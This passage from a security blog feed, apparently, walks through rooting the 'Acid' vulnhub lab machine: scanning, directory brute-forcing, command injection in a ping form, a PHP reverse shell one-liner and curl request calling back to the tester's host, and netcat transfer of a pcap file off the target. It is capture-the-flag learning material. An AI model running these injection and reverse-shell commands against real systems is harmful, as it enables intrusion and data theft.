&lt;span class="code-line"&gt;&lt;span class="n"&gt;TM2C0X57&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;ok7eqj8gUEuX&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="n"&gt;FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Gms&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;PiAQ&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;-----END PGP PUBLIC KEY BLOCK-----&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="conclusion"&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;This box was fun. The url were unpredictable and dirbuster doesn't spoil all the
fun for us. Thank to &lt;a href="https://twitter.com/@ly0nx"&gt;@ly0nx&lt;/a&gt; for this box and
&lt;a href="http://vulnhub.com"&gt;vulnhub&lt;/a&gt; as always.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="vulnhub"></category><category term="challenge"></category><category term="linux"></category></entry><entry><title>Vulnhub - Acid</title><link href="https://maggick.fr/2015/09/vulnhub-acid.html" rel="alternate"></link><published>2015-09-11T11:30:00+02:00</published><updated>2015-09-11T11:30:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2015-09-11:/2015/09/vulnhub-acid.html</id><summary type="html">&lt;p&gt;&lt;img alt="acid" class="align-left" src="/media/2015.09/bg.jpg" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;Since &lt;a href="https://maggick.fr/2015/06/vulnhub-fart-knocker.html"&gt;Fart knocker&lt;/a&gt;
in June I have worked on an other vulnhub machine:
&lt;a href="https://www.vulnhub.com/entry/darknet-10,120/"&gt;darknet&lt;/a&gt;. But this one is really
hard and get me stuck. I was a bit demotivated to continue vulnhub's machines but
I got some time this week, therefore I tried the
&lt;a href="https://www.vulnhub.com/entry/acid-server,125/"&gt;Acid&lt;/a&gt; one.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left"
src="/media/2015.09/bg.jpg" alt="acid" width="262"&gt;&lt;/p&gt;
&lt;p&gt;Since &lt;a href="https://maggick.fr/2015/06/vulnhub-fart-knocker.html"&gt;Fart knocker&lt;/a&gt;
in June I have worked on an other vulnhub machine:
&lt;a href="https://www.vulnhub.com/entry/darknet-10,120/"&gt;darknet&lt;/a&gt;. But this one is really
hard and get me stuck. I was a bit demotivated to continue vulnhub's machines but
I got some time this week, therefore I tried the
&lt;a href="https://www.vulnhub.com/entry/acid-server,125/"&gt;Acid&lt;/a&gt; one.&lt;/p&gt;


&lt;p&gt;The goal is as usual, get root on the virtual machine. Let's go:&lt;/p&gt;
&lt;h2 id="host-discovery"&gt;Host Discovery&lt;/h2&gt;
&lt;p&gt;As always, we start with host discovery:
&lt;a href="http://nmap.org"&gt;Nmap&lt;/a&gt; and &lt;a href="https://cirt.net/Nikto2"&gt;nikto&lt;/a&gt; are our friends for
this step.&lt;/p&gt;
&lt;h3 id="nmap"&gt;nmap&lt;/h3&gt;
&lt;p&gt;We launch nmap against the virtual machine:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ nmap 192.168.0.18 -p0-65535 -A -oA nmap&lt;/span&gt;
&lt;span class="code-line"&gt;Starting Nmap 6.47 ( http://nmap.org ) at 2015-09-08 12:08 CEST&lt;/span&gt;
&lt;span class="code-line"&gt;Stats: 0:07:31 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan&lt;/span&gt;
&lt;span class="code-line"&gt;Connect Scan Timing: About 98.89% done; ETC: 12:15 (0:00:05 remaining)&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 192.168.0.18&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.0045s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65535 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT      STATE SERVICE&lt;/span&gt;
&lt;span class="code-line"&gt;33447/tcp open  unknown&lt;/span&gt;
&lt;span class="code-line"&gt;|_http-title: /Challenge&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at&lt;/span&gt;
&lt;span class="code-line"&gt;http://nmap.org/submit/ .&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We got a nice Apache web server with a simple splash screen. Notice the page
title: &lt;strong&gt;/Challenge&lt;/strong&gt;.&lt;/p&gt;
&lt;h3 id="nikto"&gt;Nikto&lt;/h3&gt;
&lt;p&gt;I ran nikto on the target but nothing pop out.&lt;/p&gt;
&lt;h2 id="web-exploitation"&gt;Web exploitation&lt;/h2&gt;
&lt;h3 id="page-source"&gt;Page source&lt;/h3&gt;
&lt;p&gt;As we come pretty empty handed, we check the page source and two interesting
things came out:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Some hexadecimal code at the end of the page: 0x643239334c6d70775a773d3d&lt;/li&gt;
&lt;li&gt;the title of the page (we can see it in the nmap scan) is /Challenge
    and there is an other web page at this address.&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id="hexa-code"&gt;Hexa code&lt;/h4&gt;
&lt;p&gt;We will start with the first lead the hexadecimal code:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;0x643239334c6d70775a773d3d&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We convert it to string and we got:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;?d293LmpwZw==&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We decode the base64 and we got:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;wow.jpg&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We go to the url (the /images/ is given with the background image of the first
web page):&lt;/p&gt;
&lt;p&gt;http://192.168.0.18:33447/images/wow.jpg&lt;/p&gt;
&lt;p&gt;As a result we got a nice image that reward us for our success.&lt;/p&gt;
&lt;p&gt;&lt;img alt="wow.jpg" src="/media/2015.09/wow.jpg"&gt;&lt;/p&gt;
&lt;p&gt;Yeah it seems to be some troll :)&lt;/p&gt;
&lt;h3 id="challenge"&gt;/Challenge&lt;/h3&gt;
&lt;p&gt;Let us dig the second lead: the page title. By adding &lt;code&gt;/Challenge&lt;/code&gt; in the URL,
we land on an authentication interface.&lt;/p&gt;
&lt;p&gt;I tried to use SQL injection but nothing. We will try
&lt;a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project"&gt;dirbuster&lt;/a&gt;
with the small dictionary (`/usr/share/dirbuster/directory-list-2.3-small.txt):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;DirBuster 1.0-RC1 - Report&lt;/span&gt;
&lt;span class="code-line"&gt;http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project&lt;/span&gt;
&lt;span class="code-line"&gt;Report produced on Tue Sep 08 16:54:05 CEST 2015&lt;/span&gt;
&lt;span class="code-line"&gt;--------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;http://192.168.0.18:33447&lt;/span&gt;
&lt;span class="code-line"&gt;--------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;Directories found during testing:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Dirs found with a 200 response:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;/Challenge/&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Dirs found with a 403 response:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;/Challenge/css/&lt;/span&gt;
&lt;span class="code-line"&gt;/Challenge/includes/&lt;/span&gt;
&lt;span class="code-line"&gt;/Challenge/js/&lt;/span&gt;
&lt;span class="code-line"&gt;/Challenge/styles/&lt;/span&gt;
&lt;span class="code-line"&gt;/Challenge/less/&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;--------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;Files found during testing:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Files found with a 200 responce:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;/Challenge/index.php&lt;/span&gt;
&lt;span class="code-line"&gt;/Challenge/error.php&lt;/span&gt;
&lt;span class="code-line"&gt;/Challenge/includes/functions.php&lt;/span&gt;
&lt;span class="code-line"&gt;/Challenge/cake.php&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Files found with a 302 responce:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;/Challenge/include.php&lt;/span&gt;
&lt;span class="code-line"&gt;/Challenge/includes/logout.php&lt;/span&gt;
&lt;span class="code-line"&gt;/Challenge/hacked.php&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;--------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We got the &lt;code&gt;cake.php&lt;/code&gt; page but as we all know "The cake is a lie". We noticed
that the page title is one more time a folder: &lt;code&gt;/Magic_box&lt;/code&gt;.
When going to &lt;code&gt;/Challenge/Magic_box&lt;/code&gt; we got a 403 forbidden page. Let us fire
&lt;a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project"&gt;dirbuster&lt;/a&gt;
again:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;DirBuster 1.0-RC1 - Report&lt;/span&gt;
&lt;span class="code-line"&gt;http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project&lt;/span&gt;
&lt;span class="code-line"&gt;Report produced on Tue Sep 08 17:17:43 CEST 2015&lt;/span&gt;
&lt;span class="code-line"&gt;--------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;http://192.168.0.18:33447&lt;/span&gt;
&lt;span class="code-line"&gt;--------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;Directories found during testing:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Dirs found with a 403 response:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;/Challenge/Magic_Box/&lt;/span&gt;
&lt;span class="code-line"&gt;/Challenge/Magic_Box/proc/&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;--------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;Files found during testing:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Files found with a 200 responce:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;/Challenge/Magic_Box/low.php&lt;/span&gt;
&lt;span class="code-line"&gt;/Challenge/Magic_Box/command.php&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Files found with a 302 responce:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;/Challenge/Magic_Box/proc/validate.php&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;--------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We got some nice result mostly the &lt;code&gt;/command.php&lt;/code&gt; page.&lt;/p&gt;
&lt;h3 id="command-execution"&gt;Command execution&lt;/h3&gt;
&lt;p&gt;The page let us ping an other machine in the network. Nevertheless the page name
let us think that we can use command exploitation. If we add a &lt;code&gt;;&lt;/code&gt; in the filed
and a command it seems to works, for instance with &lt;code&gt;; ls&lt;/code&gt; we got (I use
&lt;a href="http://releases.portswigger.net/"&gt;burp&lt;/a&gt; for all my pentest, the output of the
command is in the response page):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;command.php&lt;/span&gt;
&lt;span class="code-line"&gt;command.php.save&lt;/span&gt;
&lt;span class="code-line"&gt;command2.php.save&lt;/span&gt;
&lt;span class="code-line"&gt;command2.php.save.1&lt;/span&gt;
&lt;span class="code-line"&gt;low.php&lt;/span&gt;
&lt;span class="code-line"&gt;proc&lt;/span&gt;
&lt;span class="code-line"&gt;tails.php&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can also read &lt;code&gt;/etc/passwd&lt;/code&gt;: there is two users on the server: acid and
saman.&lt;/p&gt;
&lt;p&gt;Let us try to get a reverse shell with that.&lt;/p&gt;
&lt;h3 id="reverse-shell"&gt;reverse shell&lt;/h3&gt;
&lt;p&gt;As always, a good source of information is
&lt;a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"&gt;pentest monkey&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;We know the site use php so we will try the php reverse shell first:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;On the host we execute: &lt;code&gt;nc -l -p 6666&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;On the target (via the ping interface) we query:
    &lt;code&gt;; php -r '$sock=fsockopen("192.168.0.13",6666);exec("/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3");'&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;It got us a shell on the machine (without tty/pty). But executing the request in the ping
interface each time we want the shell in painful, so I extract the curl command
from burp:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;curl -i -s -k  -X &amp;#39;POST&amp;#39; \&lt;/span&gt;
&lt;span class="code-line"&gt;    -H &amp;#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0&amp;#39; -H &amp;#39;DNT: 1&amp;#39; -H &amp;#39;Referer: http://192.168.0.18:33447/Challenge/Magic_Box/command.php&amp;#39; -H &amp;#39;Content-Type: application/x-www-form-urlencoded&amp;#39; \&lt;/span&gt;
&lt;span class="code-line"&gt;    -b &amp;#39;sec_session_id=2cdjrm9k6khpfiilsad1kmnpj2&amp;#39; \&lt;/span&gt;
&lt;span class="code-line"&gt;    --data-binary $&amp;#39;IP=%3B+php+-r+%27%24sock%3Dfsockopen%28%22192.168.0.13%22%2C6666%29%3Bexec%28%22%2Fbin%2Fsh+-i+%3C%263+%3E%263+2%3E%263%22%29%3B%27&amp;amp;submit=submit&amp;#39; \&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;#39;http://192.168.0.18:33447/Challenge/Magic_Box/command.php&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Now that we have a shell, let us see what we can do.&lt;/p&gt;
&lt;h2 id="shell-exploitation"&gt;Shell exploitation&lt;/h2&gt;
&lt;p&gt;First we discover what is at our disposal, mostly in the &lt;code&gt;/home/&lt;/code&gt;
(&lt;code&gt;bash_history&lt;/code&gt;). In the &lt;code&gt;/home/acid/&lt;/code&gt; there is something interesting but
empty:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ls -la /home/acid/.su*&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-r--r-- 1 acid acid 0 Jul 31 17:27 /home/acid/.sudo_as_admin_successful&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Let us see what else we got on the machine:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;ls&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nx"&gt;bin&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nx"&gt;boot&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nx"&gt;cdrom&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nx"&gt;dev&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nx"&gt;etc&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nx"&gt;home&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nx"&gt;initrd&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;img&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nx"&gt;lib&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nx"&gt;lost&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nx"&gt;found&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nx"&gt;media&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nx"&gt;mnt&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nx"&gt;opt&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nx"&gt;proc&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nx"&gt;root&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nx"&gt;run&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nx"&gt;s&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;bin&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nx"&gt;sbin&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nx"&gt;srv&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nx"&gt;sys&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nx"&gt;tmp&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nx"&gt;usr&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kd"&gt;var&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nx"&gt;vmlinuz&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;ls&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nx"&gt;opt&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;ls&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nx"&gt;media&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nx"&gt;acid&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nx"&gt;floppy&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nx"&gt;floppy0&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;ls&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nx"&gt;s&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;bin&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nx"&gt;investigate&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;php&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;cat&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nx"&gt;s&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nx"&gt;investigate&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;php&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Now you have to behave like an investigator to catch the culprit&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;?&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;That is interesting the php file in &lt;code&gt;/s.bin/&lt;/code&gt; clearly tell us to investigate.
But what we need know is a privilege escalation ti gain root access.&lt;/p&gt;
&lt;h3 id="privilege-escalation"&gt;Privilege escalation&lt;/h3&gt;
&lt;p&gt;I tried the overlayfs exploit (the same as with
&lt;a href="https://maggick.fr/2015/06/vulnhub-fart-knocker.html"&gt;Fart knocker&lt;/a&gt;)
without success:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;I compiled the exploit on an other 32 bits virtual machine;&lt;/li&gt;
&lt;li&gt;I transfered it to the shell via netcat;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;And it failed:&lt;/p&gt;
&lt;p&gt;$ ./ofs.bin  : 4:
spawning threads
mount #1
mount #2
child threads done
exploit failed&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;But we were given an hint.&lt;/p&gt;
&lt;h3 id="more-investigations"&gt;More investigations&lt;/h3&gt;
&lt;p&gt;The &lt;a href="http://pwnwiki.io/#!privesc/linux/index.md"&gt;pwnwiki.io&lt;/a&gt; wiki is always a
good source of information. So with more investigation we look at bash_history,
search for &lt;code&gt;*txt*&lt;/code&gt; files, an so on. Then &lt;code&gt;*pcap*&lt;/code&gt; files:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ find / -name *pcap* &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;/dev/null&lt;/span&gt;
&lt;span class="code-line"&gt;/lib/modules/3.19.0-15-generic/kernel/drivers/rtc/rtc-pcap.ko&lt;/span&gt;
&lt;span class="code-line"&gt;/lib/modules/3.19.0-15-generic/kernel/drivers/input/misc/pcap_keys.ko&lt;/span&gt;
&lt;span class="code-line"&gt;/lib/modules/3.19.0-15-generic/kernel/drivers/input/touchscreen/pcap_ts.ko&lt;/span&gt;
&lt;span class="code-line"&gt;/lib/modules/3.19.0-15-generic/kernel/drivers/regulator/pcap-regulator.ko&lt;/span&gt;
&lt;span class="code-line"&gt;/sbin/raw_vs_isi/hint.pcapng&lt;/span&gt;
&lt;span class="code-line"&gt;/sbin/getpcaps&lt;/span&gt;
&lt;span class="code-line"&gt;/sys/bus/spi/drivers/ezx-pcap&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/share/doc/libpcap0.8&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/share/mime/application/vnd.tcpdump.pcap.xml&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/share/man/man7/pcap-filter.7.gz&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/share/man/man1/getpcaps.1.gz&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/lib/i386-linux-gnu/libpcap.so.1.6.2&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/lib/i386-linux-gnu/libpcap.so.0.8&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/src/linux-headers-3.19.0-15/include/linux/mfd/ezx-pcap.h&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/src/linux-headers-3.19.0-15-generic/include/config/ezx/pcap.h&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/src/linux-headers-3.19.0-15-generic/include/config/touchscreen/pcap.h&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/src/linux-headers-3.19.0-15-generic/include/config/rtc/drv/pcap.h&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/src/linux-headers-3.19.0-15-generic/include/config/input/pcap.h&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/src/linux-headers-3.19.0-15-generic/include/config/regulator/pcap.h&lt;/span&gt;
&lt;span class="code-line"&gt;/var/lib/dpkg/info/libpcap0.8:i386.postinst&lt;/span&gt;
&lt;span class="code-line"&gt;/var/lib/dpkg/info/libpcap0.8:i386.shlibs&lt;/span&gt;
&lt;span class="code-line"&gt;/var/lib/dpkg/info/libpcap0.8:i386.postrm&lt;/span&gt;
&lt;span class="code-line"&gt;/var/lib/dpkg/info/libpcap0.8:i386.md5sums&lt;/span&gt;
&lt;span class="code-line"&gt;/var/lib/dpkg/info/libpcap0.8:i386.symbols&lt;/span&gt;
&lt;span class="code-line"&gt;/var/lib/dpkg/info/libpcap0.8:i386.list&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Yes &lt;code&gt;/sbin/raw_vs_isi/hint.pcapng&lt;/code&gt;!&lt;/p&gt;
&lt;h3 id="pcap"&gt;pcap&lt;/h3&gt;
&lt;p&gt;We transfer the file with netcat:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;On our attack machine: &lt;code&gt;nc -lp 1234 &amp;gt; pcap&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;On the server: &lt;code&gt;nc 192.168.0.13 1234 &amp;lt; /sbin/raw_vs_isi/hint.pcapng&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
